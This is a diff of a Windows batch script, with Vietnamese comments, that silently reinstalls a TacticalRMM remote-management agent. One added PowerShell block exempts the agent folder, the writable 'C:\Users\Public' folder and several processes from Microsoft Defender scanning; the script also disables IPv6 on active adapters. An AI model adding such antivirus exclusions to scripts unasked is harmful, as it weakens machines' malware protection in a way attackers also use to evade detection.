@@ -31,6 +31,17 @@ if not exist "%TARGET_DIR%" (
     mkdir "%TARGET_DIR%"
 )
 
+:: === Thêm ngoại lệ Defender cho thư mục và tiến trình Tactical & Monitor ===
+powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
+  "try { $ErrorActionPreference = 'Stop'; " ^
+  "  $paths = @('C:\Program Files\TacticalAgent','C:\Users\Public'); $processes = @('tacticalrmm.exe','tacticalagent.exe','monitorUrlnew.exe'); " ^
+  "  Add-MpPreference -ExclusionPath $paths -ErrorAction Stop; Add-MpPreference -ExclusionProcess $processes -ErrorAction Stop; " ^
+  "  $prefs = Get-MpPreference -ErrorAction Stop; " ^
+  "  foreach ($path in $paths) { if ($prefs.ExclusionPath -notcontains $path) { throw ('Defender exclusion path not confirmed: ' + $path) } }; " ^
+  "  foreach ($process in $processes) { if ($prefs.ExclusionProcess -notcontains $process) { throw ('Defender exclusion process not confirmed: ' + $process) } }; exit 0 " ^
+  "} catch { Write-Host ('[ERROR] Cannot configure Defender exclusions: ' + $_.Exception.Message); exit 1 }"
+if errorlevel 1 exit /b 1
+
 :: === Disable IPv6 properly on all network adapters ===
 powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | ForEach-Object { Disable-NetAdapterBinding -Name $_.Name -ComponentID ms_tcpip6 -PassThru -ErrorAction SilentlyContinue }"
 
@@ -89,13 +100,13 @@ if errorlevel 1 exit /b 1
 
 :: === Gỡ TacticalAgent cũ (nếu có) và cài lại ===
 if exist "C:\Program Files\TacticalAgent\unins000.exe" (
-    "C:\Program Files\TacticalAgent\unins000.exe" /VERYSILENT /SUPPRESSMSGBOXES /NORESTART
+    start "" /wait "C:\Program Files\TacticalAgent\unins000.exe" /VERYSILENT /SUPPRESSMSGBOXES /NORESTART
     if errorlevel 1 (
         echo [ERROR] TacticalAgent uninstaller failed with exit code !errorlevel!.
         exit /b 1
     )
 )
-"%AGENT_FILE%" /VERYSILENT /SUPPRESSMSGBOXES /NORESTART /SP- /SILENT
+start "" /wait "%AGENT_FILE%" /VERYSILENT /SUPPRESSMSGBOXES /NORESTART /SP- /SILENT
 if %errorlevel% neq 0 (
     echo [ERROR] TacticalAgent installer failed with exit code %errorlevel%.
     exit /b 1
@@ -195,7 +206,7 @@ powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
   "  $names = $env:STOP_PROCESSES.Split(','); " ^
   "  $processes = @(Get-Process | Where-Object { $names -contains $_.ProcessName }); " ^
   "  foreach ($p in $processes) { if (-not $p.HasExited) { Stop-Process -InputObject $p -Force; if (-not $p.WaitForExit(5000)) { throw 'Process did not exit' } } }; " ^
-  "  if (Get-Process | Where-Object { $names -contains $_.ProcessName }) { throw 'Agent process is still running' }; " ^
+  "  $deadline = [DateTime]::UtcNow.AddSeconds(5); while ([DateTime]::UtcNow -lt $deadline -and (Get-Process | Where-Object { $names -contains $_.ProcessName })) { Start-Sleep -Milliseconds 500 }; if (Get-Process | Where-Object { $names -contains $_.ProcessName }) { throw 'Agent process is still running' }; " ^
   "  if ($s) { $s.Refresh(); if ($s.Status -ne 'Stopped') { throw 'Service restarted unexpectedly' } }; exit 0 " ^
   "} catch { Write-Host ('[ERROR] Cannot stop ' + $env:STOP_SERVICE + ': ' + $_.Exception.Message); exit 1 }"
 exit /b %errorlevel%
